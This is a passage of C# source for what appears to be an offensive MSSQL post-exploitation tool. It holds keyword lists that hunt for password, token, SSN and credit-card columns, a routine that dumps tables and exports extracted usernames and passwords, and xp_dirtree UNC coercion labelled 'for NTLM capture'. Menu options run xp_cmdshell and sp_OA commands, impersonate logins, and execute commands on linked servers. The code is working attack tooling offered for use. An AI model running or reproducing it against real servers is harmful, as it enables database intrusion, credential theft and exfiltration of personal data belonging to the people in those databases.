			Console.WriteLine($"   0) Back to main menu");
			
			Console.Write("\nSelect table or action: ");
			string choice = Console.ReadLine();
			
			if (choice == "0")
			{
				currentDb = "EXIT";
				return;
			}
			else if (choice?.ToLower() == "b")
			{
				currentDb = null;
				return;
			}

			if (int.TryParse(choice, out int tableIndex))
			{
				if (tableIndex >= 1 && tableIndex <= tables.Count)
				{
					var table = tables[tableIndex - 1];
					selectedTable = $"[{currentDb}].{table.schema}.{table.name}";
					return;
				}
				else if (tableIndex == tables.Count + 1)
				{
					SearchInterestingTablesInDatabase(currentDb, con);
					Console.WriteLine("\nPress any key to continue...");
					Console.ReadKey();
					return;
				}
				else if (tableIndex == tables.Count + 2)
				{
					SearchCredentialsInDatabase(currentDb, con);
					Console.WriteLine("\nPress any key to continue...");
					Console.ReadKey();
					return;
				}
				else if (tableIndex == tables.Count + 3)
				{
					SearchSensitiveDataInDatabase(currentDb, con);
					Console.WriteLine("\nPress any key to continue...");
					Console.ReadKey();
					return;
				}
				else if (tableIndex == tables.Count + 4)
				{
					Console.Write("Column name to search for: ");
					string columnName = Console.ReadLine();
					FindTablesWithColumnInDatabase(currentDb, columnName, con);
					Console.WriteLine("\nPress any key to continue...");
					Console.ReadKey();
					return;
				}
			}
			
			Console.WriteLine("Invalid selection!");
		}

		private static void ShowTableLevelMenu(SqlConnection con, string currentDb, ref string currentTable)
		{
			Console.WriteLine($"Table: {currentTable}");
			
			Console.WriteLine("\nTable Actions:");
			Console.WriteLine("  1) Show table structure");
			Console.WriteLine("  2) Dump table contents (first 100 rows)");
			Console.WriteLine("  3) Dump table contents (custom limit)");
			Console.WriteLine("  4) Count total rows");
			Console.WriteLine("  5) Show sample data (first 5 rows)");
			Console.WriteLine("\n  b) Back to table list");
			Console.WriteLine("  0) Back to main menu");
			
			Console.Write("\nSelect action: ");
			string choice = Console.ReadLine();
			
			switch (choice)
			{
				case "0":
					currentTable = "EXIT";
					return;
				case "b":
					currentTable = null;
					return;
				case "1":
					DescribeTable(currentTable, con);
					break;
				case "2":
					DumpTableContents(currentTable, 100, con);
					break;
				case "3":
					Console.Write("Max rows to display: ");
					if (int.TryParse(Console.ReadLine(), out int maxRows))
					{
						DumpTableContents(currentTable, maxRows, con);
					}
					else
					{
						Console.WriteLine("Invalid number!");
					}
					break;
				case "4":
					CountTableRows(currentTable, con);
					break;
				case "5":
					DumpTableContents(currentTable, 5, con);
					break;
				default:
					Console.WriteLine("Invalid selection!");
					break;
			}
			
			if (choice != "0" && choice != "b")
			{
				Console.WriteLine("\nPress any key to continue...");
				Console.ReadKey();
			}
		}

		private static void CountTableRows(string tableName, SqlConnection con)
		{
			Console.WriteLine($"\n[*] Counting rows in table '{tableName}':");
			
			string sql = $"SELECT COUNT(*) FROM {tableName};";
			
			try
			{
				string count = ExecuteScalar(sql, con);
				Console.WriteLine($"   Total rows: {count}");
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[!] Error: {ex.Message}");
			}
		}

			// Database-specific search functions
	private static void SearchInterestingTablesInDatabase(string dbName, SqlConnection con)
	{
		Console.WriteLine($"\n[*] Searching for interesting tables in database '{dbName}'...");
		
		string[] keywords = { "user", "admin", "password", "credential", "login", "account", "auth", "config", "setting", "secret", "key", "token", "session" };
		var foundTables = new List<object>();
		
		foreach (string keyword in keywords)
		{
			string sql = $@"SELECT t.TABLE_SCHEMA, t.TABLE_NAME
				FROM [{dbName}].INFORMATION_SCHEMA.TABLES t 
				WHERE LOWER(t.TABLE_NAME) LIKE '%{keyword}%' AND t.TABLE_TYPE = 'BASE TABLE'
				ORDER BY t.TABLE_SCHEMA, t.TABLE_NAME;";
			
			try
			{
				using (var cmd = new SqlCommand(sql, con))
				using (var reader = cmd.ExecuteReader())
				{
					bool hasResults = false;
					while (reader.Read())
					{
						if (!hasResults)
						{
							Console.WriteLine($"\n   Tables containing '{keyword}':");
							hasResults = true;
						}
						string schema = reader[0].ToString();
						string tableName = reader[1].ToString();
						Console.WriteLine($"     > {schema}.{tableName}");
						foundTables.Add(new { Database = dbName, Schema = schema, Table = tableName, Keyword = keyword });
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[!] Error searching for '{keyword}': {ex.Message}");
				logger?.LogAction("SEARCH_ERROR", $"Search interesting tables in {dbName}", ex.Message, "ERROR");
			}
		}
		
		// Log found interesting tables
		if (foundTables.Any())
		{
			string tablesJson = JsonSerializer.Serialize(foundTables, new JsonSerializerOptions { WriteIndented = true });
			logger?.LogAction("INTERESTING_TABLES", $"Interesting tables in {dbName}", tablesJson);
		}
	}

			private static void SearchCredentialsInDatabase(string dbName, SqlConnection con)
	{
		Console.WriteLine($"\n[*] Searching for credential-related columns in database '{dbName}'...");
		
		string[] credKeywords = { "password", "passwd", "pwd", "pass", "credential", "cred", "secret", "key", "token", "hash", "salt" };
		var foundCredColumns = new List<object>();
		
		foreach (string keyword in credKeywords)
		{
			string sql = $@"SELECT t.TABLE_SCHEMA, t.TABLE_NAME, c.COLUMN_NAME, c.DATA_TYPE
				FROM [{dbName}].INFORMATION_SCHEMA.TABLES t
				INNER JOIN [{dbName}].INFORMATION_SCHEMA.COLUMNS c ON t.TABLE_NAME = c.TABLE_NAME AND t.TABLE_SCHEMA = c.TABLE_SCHEMA
				WHERE LOWER(c.COLUMN_NAME) LIKE '%{keyword}%' AND t.TABLE_TYPE = 'BASE TABLE'
				ORDER BY t.TABLE_SCHEMA, t.TABLE_NAME, c.COLUMN_NAME;";
			
			try
			{
				using (var cmd = new SqlCommand(sql, con))
				using (var reader = cmd.ExecuteReader())
				{
					bool hasResults = false;
					while (reader.Read())
					{
						if (!hasResults)
						{
							Console.WriteLine($"\n   Columns containing '{keyword}':");
							hasResults = true;
						}
						string schema = reader[0].ToString();
						string tableName = reader[1].ToString();
						string columnName = reader[2].ToString();
						string dataType = reader[3].ToString();
						Console.WriteLine($"     > {schema}.{tableName}.{columnName} ({dataType})");
						foundCredColumns.Add(new { Database = dbName, Schema = schema, Table = tableName, Column = columnName, DataType = dataType, Keyword = keyword });
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[!] Error searching for '{keyword}': {ex.Message}");
				logger?.LogAction("SEARCH_ERROR", $"Search credentials in {dbName}", ex.Message, "ERROR");
			}
		}
		
		// Log found credential columns
		if (foundCredColumns.Any())
		{
			string credColumnsJson = JsonSerializer.Serialize(foundCredColumns, new JsonSerializerOptions { WriteIndented = true });
			logger?.LogAction("CREDENTIAL_COLUMNS", $"Credential columns in {dbName}", credColumnsJson);
		}
	}

			private static void SearchSensitiveDataInDatabase(string dbName, SqlConnection con)
	{
		Console.WriteLine($"\n[*] Searching for sensitive data patterns in database '{dbName}'...");
		
		string[] patterns = { "ssn", "social", "credit", "card", "email", "phone", "address", "salary", "wage", "personal", "private", "confidential" };
		var foundSensitiveColumns = new List<object>();
		
		foreach (string pattern in patterns)
		{
			string sql = $@"SELECT t.TABLE_SCHEMA, t.TABLE_NAME, c.COLUMN_NAME, c.DATA_TYPE
				FROM [{dbName}].INFORMATION_SCHEMA.TABLES t
				INNER JOIN [{dbName}].INFORMATION_SCHEMA.COLUMNS c ON t.TABLE_NAME = c.TABLE_NAME AND t.TABLE_SCHEMA = c.TABLE_SCHEMA
				WHERE LOWER(c.COLUMN_NAME) LIKE '%{pattern}%' AND t.TABLE_TYPE = 'BASE TABLE'
				ORDER BY t.TABLE_SCHEMA, t.TABLE_NAME, c.COLUMN_NAME;";
			
			try
			{
				using (var cmd = new SqlCommand(sql, con))
				using (var reader = cmd.ExecuteReader())
				{
					bool hasResults = false;
					while (reader.Read())
					{
						if (!hasResults)
						{
							Console.WriteLine($"\n   Columns containing '{pattern}':");
							hasResults = true;
						}
						string schema = reader[0].ToString();
						string tableName = reader[1].ToString();
						string columnName = reader[2].ToString();
						string dataType = reader[3].ToString();
						Console.WriteLine($"     > {schema}.{tableName}.{columnName} ({dataType})");
						foundSensitiveColumns.Add(new { Database = dbName, Schema = schema, Table = tableName, Column = columnName, DataType = dataType, Pattern = pattern });
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[!] Error searching for '{pattern}': {ex.Message}");
				logger?.LogAction("SEARCH_ERROR", $"Search sensitive data in {dbName}", ex.Message, "ERROR");
			}
		}
		
		// Log found sensitive data columns
		if (foundSensitiveColumns.Any())
		{
			string sensitiveColumnsJson = JsonSerializer.Serialize(foundSensitiveColumns, new JsonSerializerOptions { WriteIndented = true });
			logger?.LogAction("SENSITIVE_DATA_COLUMNS", $"Sensitive data columns in {dbName}", sensitiveColumnsJson);
		}
	}

		private static void FindTablesWithColumnInDatabase(string dbName, string columnName, SqlConnection con)
		{
			Console.WriteLine($"\n[*] Tables containing column '{columnName}' in database '{dbName}':");
			
			string sql = $@"SELECT t.TABLE_SCHEMA, t.TABLE_NAME, c.COLUMN_NAME, c.DATA_TYPE, c.IS_NULLABLE
				FROM [{dbName}].INFORMATION_SCHEMA.TABLES t
				INNER JOIN [{dbName}].INFORMATION_SCHEMA.COLUMNS c ON t.TABLE_NAME = c.TABLE_NAME AND t.TABLE_SCHEMA = c.TABLE_SCHEMA
				WHERE LOWER(c.COLUMN_NAME) LIKE '%{columnName.ToLower()}%' AND t.TABLE_TYPE = 'BASE TABLE'
				ORDER BY t.TABLE_SCHEMA, t.TABLE_NAME;";
			
			try
			{
				using (var cmd = new SqlCommand(sql, con))
				using (var reader = cmd.ExecuteReader())
				{
					while (reader.Read())
					{
						Console.WriteLine($"   > {reader[0]}.{reader[1]}.{reader[2]} ({reader[3]}, {reader[4]})");
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[!] Error: {ex.Message}");
			}
		}

		private static void ListAllDatabases(SqlConnection con)
		{
			Console.WriteLine("\n[*] Available Databases:");
			string sql = "SELECT name, database_id, create_date FROM sys.databases ORDER BY name;";
			
			try
			{
				using (var cmd = new SqlCommand(sql, con))
				using (var reader = cmd.ExecuteReader())
				{
					while (reader.Read())
					{
						Console.WriteLine($"   > {reader[0]} (ID: {reader[1]}, Created: {reader[2]})");
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[!] Error: {ex.Message}");
			}
		}

		private static void ListTablesInCurrentDatabase(SqlConnection con)
		{
			string currentDb = ExecuteScalar("SELECT DB_NAME();", con);
			Console.WriteLine($"\n[*] Tables in database '{currentDb}':");
			
			string sql = @"SELECT 
				t.TABLE_SCHEMA, 
				t.TABLE_NAME, 
				t.TABLE_TYPE
			FROM INFORMATION_SCHEMA.TABLES t 
			ORDER BY t.TABLE_SCHEMA, t.TABLE_NAME;";
			
			try
			{
				using (var cmd = new SqlCommand(sql, con))
				using (var reader = cmd.ExecuteReader())
				{
					while (reader.Read())
					{
						Console.WriteLine($"   > {reader[0]}.{reader[1]} ({reader[2]})");
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[!] Error: {ex.Message}");
			}
		}

		private static void ListTablesInDatabase(string dbName, SqlConnection con)
		{
			Console.WriteLine($"\n[*] Tables in database '{dbName}':");
			
			string sql = $@"SELECT 
				t.TABLE_SCHEMA, 
				t.TABLE_NAME, 
				t.TABLE_TYPE
			FROM [{dbName}].INFORMATION_SCHEMA.TABLES t 
			ORDER BY t.TABLE_SCHEMA, t.TABLE_NAME;";
			
			try
			{
				using (var cmd = new SqlCommand(sql, con))
				using (var reader = cmd.ExecuteReader())
				{
					while (reader.Read())
					{
						Console.WriteLine($"   > {reader[0]}.{reader[1]} ({reader[2]})");
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[!] Error: {ex.Message}");
			}
		}

		private static void DescribeTable(string tableName, SqlConnection con)
		{
			Console.WriteLine($"\n[*] Structure of table '{tableName}':");
			
			string sql = $@"SELECT 
				c.COLUMN_NAME,
				c.DATA_TYPE,
				c.IS_NULLABLE,
				c.COLUMN_DEFAULT,
				c.CHARACTER_MAXIMUM_LENGTH
			FROM INFORMATION_SCHEMA.COLUMNS c
			WHERE c.TABLE_NAME = '{tableName.Split('.').Last().Replace("'", "''")}'
			ORDER BY c.ORDINAL_POSITION;";
			
			try
			{
				using (var cmd = new SqlCommand(sql, con))
				using (var reader = cmd.ExecuteReader())
				{
					Console.WriteLine("   Column Name          | Data Type    | Nullable | Default   | Max Length");
					Console.WriteLine("   ---------------------|--------------|----------|-----------|----------");
					while (reader.Read())
					{
						string colName = reader[0]?.ToString() ?? "";
						string dataType = reader[1]?.ToString() ?? "";
						string nullable = reader[2]?.ToString() ?? "";
						string defaultVal = reader[3]?.ToString() ?? "NULL";
						string maxLen = reader[4]?.ToString() ?? "";
						
						Console.WriteLine($"   {colName,-20} | {dataType,-12} | {nullable,-8} | {defaultVal,-9} | {maxLen}");
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[!] Error: {ex.Message}");
			}
		}

		private static void SearchInterestingTables(SqlConnection con)
		{
			Console.WriteLine("\n[*] Searching for interesting tables...");
			
			string[] keywords = { "user", "admin", "password", "credential", "login", "account", "auth", "config", "setting", "secret", "key", "token", "session" };
			
			foreach (string keyword in keywords)
			{
				string sql = $@"SELECT 
					t.TABLE_SCHEMA, 
					t.TABLE_NAME
				FROM INFORMATION_SCHEMA.TABLES t 
				WHERE LOWER(t.TABLE_NAME) LIKE '%{keyword}%'
				ORDER BY t.TABLE_SCHEMA, t.TABLE_NAME;";
				
				try
				{
					using (var cmd = new SqlCommand(sql, con))
					using (var reader = cmd.ExecuteReader())
					{
						bool hasResults = false;
						while (reader.Read())
						{
							if (!hasResults)
							{
								Console.WriteLine($"\n   Tables containing '{keyword}':");
								hasResults = true;
							}
							Console.WriteLine($"     > {reader[0]}.{reader[1]}");
						}
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine($"[!] Error searching for '{keyword}': {ex.Message}");
				}
			}
		}

		private static void SearchCredentials(SqlConnection con)
		{
			Console.WriteLine("\n[*] Searching for credential-related columns...");
			
			string[] credKeywords = { "password", "passwd", "pwd", "pass", "credential", "cred", "secret", "key", "token", "hash", "salt" };
			
			foreach (string keyword in credKeywords)
			{
				string sql = $@"SELECT 
					t.TABLE_SCHEMA,
					t.TABLE_NAME,
					c.COLUMN_NAME,
					c.DATA_TYPE
				FROM INFORMATION_SCHEMA.TABLES t
				INNER JOIN INFORMATION_SCHEMA.COLUMNS c ON t.TABLE_NAME = c.TABLE_NAME
				WHERE LOWER(c.COLUMN_NAME) LIKE '%{keyword}%'
				ORDER BY t.TABLE_SCHEMA, t.TABLE_NAME, c.COLUMN_NAME;";
				
				try
				{
					using (var cmd = new SqlCommand(sql, con))
					using (var reader = cmd.ExecuteReader())
					{
						bool hasResults = false;
						while (reader.Read())
						{
							if (!hasResults)
							{
								Console.WriteLine($"\n   Columns containing '{keyword}':");
								hasResults = true;
							}
							Console.WriteLine($"     > {reader[0]}.{reader[1]}.{reader[2]} ({reader[3]})");
						}
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine($"[!] Error searching for '{keyword}': {ex.Message}");
				}
			}
		}

		private static void SearchSensitiveData(SqlConnection con)
		{
			Console.WriteLine("\n[*] Searching for sensitive data patterns...");
			
			string[] patterns = { "ssn", "social", "credit", "card", "email", "phone", "address", "salary", "wage", "personal", "private", "confidential" };
			
			foreach (string pattern in patterns)
			{
				string sql = $@"SELECT 
					t.TABLE_SCHEMA,
					t.TABLE_NAME,
					c.COLUMN_NAME,
					c.DATA_TYPE
				FROM INFORMATION_SCHEMA.TABLES t
				INNER JOIN INFORMATION_SCHEMA.COLUMNS c ON t.TABLE_NAME = c.TABLE_NAME
				WHERE LOWER(c.COLUMN_NAME) LIKE '%{pattern}%'
				ORDER BY t.TABLE_SCHEMA, t.TABLE_NAME, c.COLUMN_NAME;";
				
				try
				{
					using (var cmd = new SqlCommand(sql, con))
					using (var reader = cmd.ExecuteReader())
					{
						bool hasResults = false;
						while (reader.Read())
						{
							if (!hasResults)
							{
								Console.WriteLine($"\n   Columns containing '{pattern}':");
								hasResults = true;
							}
							Console.WriteLine($"     > {reader[0]}.{reader[1]}.{reader[2]} ({reader[3]})");
						}
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine($"[!] Error searching for '{pattern}': {ex.Message}");
				}
			}
		}

		private static void DumpTableContents(string tableName, int maxRows, SqlConnection con)
		{
			Console.WriteLine($"\n[*] Dumping contents of table '{tableName}' (max {maxRows} rows):");
			
			string sql = $"SELECT TOP {maxRows} * FROM {tableName};";
			
			try
			{
				using (var cmd = new SqlCommand(sql, con))
				using (var reader = cmd.ExecuteReader())
				{
					// Get column information
					var columns = new List<string>();
					for (int i = 0; i < reader.FieldCount; i++)
					{
						columns.Add(reader.GetName(i));
					}
					
					// Prepare data structures for export
					var csvData = new StringBuilder();
					var jsonRows = new List<Dictionary<string, object>>();
					
					// CSV header
					csvData.AppendLine(string.Join(",", columns.Select(c => $"\"{c}\"")));
					
					Console.WriteLine($"   {string.Join(" | ", columns)}");
					Console.WriteLine($"   {string.Join("-|-", columns.Select(c => new string('-', c.Length)))}");
					
					// Process data rows
					int rowCount = 0;
					while (reader.Read() && rowCount < maxRows)
					{
						var values = new List<string>();
						var jsonRow = new Dictionary<string, object>();
						var csvValues = new List<string>();
						
						for (int i = 0; i < reader.FieldCount; i++)
						{
							object rawValue = reader[i];
							string displayValue = rawValue?.ToString() ?? "NULL";
							string csvValue = rawValue?.ToString() ?? "";
							
							// For display - truncate long values
							if (displayValue.Length > 50) 
								displayValue = displayValue.Substring(0, 47) + "...";
							
							values.Add(displayValue);
							csvValues.Add($"\"{csvValue.Replace("\"", "\"\"")}\""); // Escape quotes for CSV
							jsonRow[columns[i]] = rawValue ?? DBNull.Value;
						}
						
						Console.WriteLine($"   {string.Join(" | ", values)}");
						csvData.AppendLine(string.Join(",", csvValues));
						jsonRows.Add(jsonRow);
						rowCount++;
					}
					
					Console.WriteLine($"\n   [Displayed {rowCount} rows]");
					
					// Export data if logger is available
					if (logger != null && rowCount > 0)
					{
						string jsonData = JsonSerializer.Serialize(jsonRows, new JsonSerializerOptions { WriteIndented = true });
						logger.ExportTableData(tableName, csvData.ToString(), jsonData);
						Console.WriteLine($"   [+] Data exported to CSV and JSON files");
						
						// Check for potential credentials and export them separately
						var credentials = ExtractCredentialsFromData(jsonRows, columns);
						if (credentials.Count > 0)
						{
							logger.ExportCredentials(credentials);
							Console.WriteLine($"   [+] Found {credentials.Count} potential credentials");
						}
					}
					
					// Log the action
					logger?.LogAction("TABLE_DUMP", $"Dump table: {tableName}", $"Retrieved {rowCount} rows");
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[!] Error: {ex.Message}");
				logger?.LogAction("TABLE_DUMP", $"Dump table: {tableName}", ex.Message, "ERROR");
			}
		}

		private static List<string> ExtractCredentialsFromData(List<Dictionary<string, object>> rows, List<string> columns)
		{
			var credentials = new List<string>();
			var credentialColumns = columns.Where(c => 
				c.ToLower().Contains("password") || 
				c.ToLower().Contains("pass") || 
				c.ToLower().Contains("pwd") || 
				c.ToLower().Contains("secret") || 
				c.ToLower().Contains("key") || 
				c.ToLower().Contains("token") ||
				c.ToLower().Contains("hash") ||
				c.ToLower().Contains("cred")).ToList();
			
			var userColumns = columns.Where(c => 
				c.ToLower().Contains("user") || 
				c.ToLower().Contains("login") || 
				c.ToLower().Contains("account") || 
				c.ToLower().Contains("name")).ToList();
			
			foreach (var row in rows)
			{
				string userInfo = "";
				string credInfo = "";
				
				// Extract user information
				foreach (var userCol in userColumns)
				{
					if (row.ContainsKey(userCol) && row[userCol] != null && row[userCol] != DBNull.Value)
					{
						userInfo += $"{userCol}:{row[userCol]} ";
					}
				}
				
				// Extract credential information
				foreach (var credCol in credentialColumns)
				{
					if (row.ContainsKey(credCol) && row[credCol] != null && row[credCol] != DBNull.Value)
					{
						string credValue = row[credCol].ToString();
						if (!string.IsNullOrWhiteSpace(credValue))
						{
							credInfo += $"{credCol}:{credValue} ";
						}
					}
				}
				
				if (!string.IsNullOrEmpty(userInfo) || !string.IsNullOrEmpty(credInfo))
				{
					credentials.Add($"{userInfo.Trim()} | {credInfo.Trim()}".Trim('|').Trim());
				}
			}
			
			return credentials;
		}

			private static void FindTablesWithColumn(string columnName, SqlConnection con)
	{
		Console.WriteLine($"\n[*] Tables containing column '{columnName}':");
		
		string sql = $@"SELECT 
			t.TABLE_SCHEMA,
			t.TABLE_NAME,
			c.COLUMN_NAME,
			c.DATA_TYPE,
			c.IS_NULLABLE
		FROM INFORMATION_SCHEMA.TABLES t
		INNER JOIN INFORMATION_SCHEMA.COLUMNS c ON t.TABLE_NAME = c.TABLE_NAME
		WHERE LOWER(c.COLUMN_NAME) LIKE '%{columnName.ToLower()}%'
		ORDER BY t.TABLE_SCHEMA, t.TABLE_NAME;";
		
		var foundColumns = new List<object>();
		
		try
		{
			using (var cmd = new SqlCommand(sql, con))
			using (var reader = cmd.ExecuteReader())
			{
				while (reader.Read())
				{
					string schema = reader[0].ToString();
					string tableName = reader[1].ToString();
					string column = reader[2].ToString();
					string dataType = reader[3].ToString();
					string nullable = reader[4].ToString();
					Console.WriteLine($"   > {schema}.{tableName}.{column} ({dataType}, {nullable})");
					foundColumns.Add(new { Schema = schema, Table = tableName, Column = column, DataType = dataType, Nullable = nullable, SearchTerm = columnName });
				}
			}
			
			// Log found columns
			if (foundColumns.Any())
			{
				string columnsJson = JsonSerializer.Serialize(foundColumns, new JsonSerializerOptions { WriteIndented = true });
				logger?.LogAction("COLUMN_SEARCH", $"Search for column: {columnName}", columnsJson);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine($"[!] Error: {ex.Message}");
			logger?.LogAction("COLUMN_SEARCH", $"Search for column: {columnName}", ex.Message, "ERROR");
		}
	}

		private static void Interactive()
		{
			Console.Write("Server hostname/IP: ");
			string srv = Console.ReadLine();
			Console.Write("Database [master]: ");
			string db = Console.ReadLine();
			if (string.IsNullOrWhiteSpace(db)) db = "master";
			Console.Write("Enable logging? (Y/n): ");
			var logResp = Console.ReadLine().Trim().ToLower();
			bool enableLogging = string.IsNullOrEmpty(logResp) || logResp.StartsWith("y");
			
			if (enableLogging)
			{
				logger = new SessionLogger(srv, true);
			}
			
			Console.Write("Use Integrated Auth? (Y/n): ");
			var resp = Console.ReadLine().Trim().ToLower();
			bool integ = string.IsNullOrEmpty(resp) || resp.StartsWith("y");
			string user = null, pass = null;
			if (!integ)
			{
				Console.Write("Username: ");
				user = Console.ReadLine();
				Console.Write("Password: ");
				pass = Console.ReadLine();
			}

			string connStr = integ ? $"Server={srv};Database={db};Integrated Security=True;" : $"Server={srv};Database={db};User ID={user};Password={pass};";
			using var con = new SqlConnection(connStr);
			try 
			{ 
				con.Open(); 
				string currentUser = ExecuteScalar("SELECT SYSTEM_USER;", con);
				Console.WriteLine("[+] Connected as " + currentUser);
				logger?.LogAction("CONNECTION", $"Interactive connection to {srv}", $"Connected as {currentUser}");
			}
			catch (Exception ex) 
			{ 
				Console.WriteLine("[!] Failed: " + ex.Message); 
				logger?.LogAction("CONNECTION", $"Interactive connection to {srv}", ex.Message, "ERROR");
				logger?.Close();
				return; 
			}

			while (true)
			{
				Console.WriteLine("\n===== MENU =====");
				Console.WriteLine(" 1) Server & privilege enumeration");
				Console.WriteLine(" 2) Run arbitrary SQL query");
				Console.WriteLine(" 3) Force UNC / xp_dirtree");
				Console.WriteLine(" 4) xp_cmdshell command");
				Console.WriteLine(" 5) sp_OA command");
				Console.WriteLine(" 6) Impersonate login");
				Console.WriteLine(" 7) Impersonate user");
				Console.WriteLine(" 8) Exec cmd on linked server");
				Console.WriteLine(" 9) Manual Database Enumeration");
				Console.WriteLine("10) Base64-encode helper");
				Console.WriteLine(" 0) Quit");
				Console.Write("Select: ");
				string choice = Console.ReadLine();

				try
				{
					switch (choice)
					{
						case "1":
							logger?.LogAction("MENU_ACTION", "Server enumeration", "Starting server enumeration");
							Enumerate(con);
							break;
						case "2":
							Console.Write("SQL> ");
							string sqlQuery = Console.ReadLine();
							logger?.LogAction("SQL_QUERY", sqlQuery, "Executing custom SQL query");
							string result = ExecuteScalar(sqlQuery, con);
							Console.WriteLine(result);
							logger?.LogAction("SQL_RESULT", sqlQuery, result);
							break;
						case "3":
							Console.Write("UNC Path: ");
							string uncPath = Console.ReadLine();
							logger?.LogAction("UNC_DIRTREE", uncPath, "Triggering xp_dirtree for NTLM capture");
							ExecuteNonQuery($"EXEC master..xp_dirtree '{uncPath}';", con);
							Console.WriteLine("[+] Triggered");
							break;
						case "4":
							ShowExecutionMenu("xp_cmdshell", con);
							break;
						case "5":
							ShowOAExecutionMenu(con);
							break;
						case "6":
							Console.Write("Login to impersonate: ");
							string loginName = Console.ReadLine().Replace("'", "''");
							logger?.LogAction("IMPERSONATE_LOGIN", loginName, "Attempting to impersonate login");
							ExecuteNonQuery($"EXECUTE AS LOGIN = '{loginName}'", con);
							string newUser = ExecuteScalar("SELECT SYSTEM_USER;", con);
							Console.WriteLine("[+] Now as " + newUser);
							logger?.LogAction("IMPERSONATE_SUCCESS", loginName, $"Successfully impersonated as {newUser}");
							break;
						case "7":
							Console.Write("User to impersonate: ");
							string userName = Console.ReadLine().Replace("'", "''");
							logger?.LogAction("IMPERSONATE_USER", userName, "Attempting to impersonate database user");
							ExecuteNonQuery($"EXECUTE AS USER = '{userName}'", con);
							string newDbUser = ExecuteScalar("SELECT USER_NAME();", con);
							Console.WriteLine("[+] Now DB user " + newDbUser);
							logger?.LogAction("IMPERSONATE_SUCCESS", userName, $"Successfully impersonated as DB user {newDbUser}");
							break;
						case "8":
							Console.Write("Linked server: ");
							string linkedServer = Console.ReadLine();
							logger?.LogAction("LINKED_SERVER_ACCESS", linkedServer, "Accessing linked server execution menu");
							ShowExecutionMenu("Linked Server Execution", con, linkedServer);
							break;
						case "9":
							logger?.LogAction("DATABASE_BROWSER", "Manual Database Enumeration", "Starting manual database browser");
							ShowDatabaseEnumerationMenu(con);
							break;
						case "10":
							Console.Write("String to encode: ");
							string inputString = Console.ReadLine();
							string encoded = B64EncodeUnicode(inputString);
							Console.WriteLine("Base64: " + encoded);
							logger?.LogAction("BASE64_ENCODE", inputString, $"Encoded to: {encoded}");
							break;
						case "0": 
							logger?.LogAction("SESSION_EXIT", "User exit", "User chose to exit session");
							logger?.Close();
							return;
						default: 
							logger?.LogAction("INVALID_MENU_CHOICE", choice, "Invalid menu selection");
							break;
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine($"[!] Error executing menu action: {ex.Message}");
					logger?.LogAction("MENU_ERROR", choice, ex.Message, "ERROR");
					Console.WriteLine("[!] Session will continue. The error has been logged.");
				}
			}
		}

		public static void Main(string[] args)
		{
			if (HasFlag(args, "--help") || HasFlag(args, "-h"))
			{
				Console.WriteLine("Usage: MSSQL.exe [--interactive] OR provide switches:\n" +
								  "  --server <hostname> [--database master] [--username <u> --password <p>]" +
								  "  --action <enum|query|dirtree|xp_cmd|impersonate_login|impersonate_user|linked_enum|linked_exec|oa_cmd> [action-options]\n" +
								  "  --log                    Enable session logging and data export\n" +
								  "  --auto                   Run comprehensive enumeration automatically\n" +
								  "  --wordlist <file>        Custom wordlist for credential/sensitive data searches\n");
				return;
			}

			if (args.Length == 0 || HasFlag(args, "--interactive"))
			{
				Interactive();
				return;
			}

			string server = Arg(args, "--server");
			if (string.IsNullOrEmpty(server))
			{
				Console.WriteLine("[!] --server is required");
				return;
			}
			string database = Arg(args, "--database", "master");
			string user = Arg(args, "--username");
			string pass = Arg(args, "--password");
			string action = Arg(args, "--action", "enum").ToLower();
			bool enableLogging = HasFlag(args, "--log");
			bool autoMode = HasFlag(args, "--auto");
			string wordlistFile = Arg(args, "--wordlist");

			// Initialize logger if requested
			if (enableLogging || autoMode)
			{
				logger = new SessionLogger(server, true);
			}

			string connStr = user == null
				? $"Server={server};Database={database};Integrated Security=True;"
				: $"Server={server};Database={database};User ID={user};Password={pass};";

			using (SqlConnection con = new SqlConnection(connStr))
			{
				try
				{
					con.Open();
					string currentUser = ExecuteScalar("SELECT SYSTEM_USER;", con);
					Console.WriteLine($"MSSQL helper build {DateTime.UtcNow:yyyy-MM-dd HH:mm} UTC\n[+] Connected to {server} as {currentUser}\n");
					logger?.LogAction("CONNECTION", $"Connect to {server}", $"Connected as {currentUser}");
				}
				catch (Exception ex)
				{
					Console.WriteLine($"[-] Connection failed: {ex.Message}");
					logger?.LogAction("CONNECTION", $"Connect to {server}", ex.Message, "ERROR");
					logger?.Close();
					return;
				}

				try
				{
					// Auto-enumeration mode
					if (autoMode)
					{
						Console.WriteLine("=== AUTO-ENUMERATION MODE ===");
						RunAutoEnumeration(con, wordlistFile);
						return;
					}

					switch (action)
					{
						case "enum":
							logger?.LogAction("CLI_ACTION", "enum", "Starting enumeration via CLI");
							Enumerate(con);
							break;
						case "query":
							string sql = Arg(args, "--sql");
							if (sql == null)
							{
								Console.WriteLine("[!] --sql is required for query action");
								logger?.LogAction("CLI_ERROR", "query", "Missing --sql parameter", "ERROR");
								return;
							}
							logger?.LogAction("CLI_SQL_QUERY", sql, "Executing SQL query via CLI");
							string queryResult = ExecuteScalar(sql, con);
							Console.WriteLine(queryResult);
							logger?.LogAction("CLI_SQL_RESULT", sql, queryResult);
							break;
						case "dirtree":
							string share = Arg(args, "--share");
							if (share == null)
							{
								Console.WriteLine("[!] --share is required for dirtree action");
								logger?.LogAction("CLI_ERROR", "dirtree", "Missing --share parameter", "ERROR");
								return;
							}
							logger?.LogAction("CLI_DIRTREE", share, "Triggering xp_dirtree via CLI");
							ExecuteNonQuery($"EXEC master..xp_dirtree '{share.Replace("'", "''")}';", con);
							Console.WriteLine("[+] Triggered xp_dirtree ✓");
							break;
						case "xp_cmd":
							string cmd = Arg(args, "--cmd", "whoami");
